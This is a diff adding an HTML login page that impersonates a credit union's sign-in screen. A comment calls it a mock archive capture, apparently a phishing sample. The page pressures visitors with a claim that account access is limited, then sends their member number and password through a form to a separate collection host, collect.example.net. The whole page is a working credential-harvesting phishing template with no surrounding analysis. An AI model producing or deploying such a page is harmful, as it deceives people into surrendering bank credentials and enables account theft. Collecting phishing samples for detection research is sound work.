@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Sign in - Example Credit Union</title>
+</head>
+<body>
+  <!-- capture cap-a-0412 (mock archive; no live host behind this page) -->
+  <main class="login-card">
+    <h1>Example Credit Union</h1>
+    <p class="subtitle">Account access is temporarily limited. Verify to continue.</p>
+
+    <form id="signin" action="https://collect.example.net/post" method="POST">
+      <label for="member">Member number</label>
+      <input id="member" name="member_id" type="text" required>
+
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" required>
+
+      <button type="submit">Verify account</button>
+    </form>
+
+    <p class="fine-print">
+      Support: helpdesk@example.com - reference case 2026-11-021.
+    </p>
+  </main>
+</body>
+</html>
